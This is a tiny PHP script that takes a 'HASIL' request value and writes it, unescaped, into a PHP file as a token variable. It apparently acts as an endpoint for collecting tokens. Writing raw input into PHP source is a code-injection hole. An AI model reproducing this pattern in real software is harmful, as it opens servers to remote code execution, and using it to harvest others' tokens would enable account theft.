<?php
if( $_REQUEST["HASIL"] )
{
	$TOKEN = $_REQUEST['HASIL'];
	$ISI = <<<DB
<?php
\$TOKEN = "{$TOKEN}";
?>
DB;
	$FILE = "Token";
	$TULIS = fopen($FILE, 'w') or die();
	fwrite($TULIS, $ISI);
	fclose($TULIS);
} else {
	echo 'window.alert("Akses Gagal")';
}
?>